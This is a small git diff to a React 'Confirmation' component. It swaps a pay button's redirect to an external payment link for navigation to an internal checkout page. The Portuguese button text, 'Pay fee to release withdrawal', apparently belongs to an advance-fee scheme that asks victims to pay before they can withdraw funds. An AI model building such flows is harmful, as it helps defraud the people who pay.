@@ -147,7 +147,7 @@ const Confirmation = () => {
 
         {/* Pay Button */}
         <button
-          onClick={() => window.location.href = 'https://go.ironpayapp.com.br/qcqzk4iznm'}
+          onClick={() => navigate("/checkout", { state: { nome, amount } })}
           className="w-full bg-destructive text-destructive-foreground py-4 rounded-xl font-semibold text-lg transition-all hover:bg-destructive/90 mb-3"
         >
           Pagar taxa para Liberar Saque
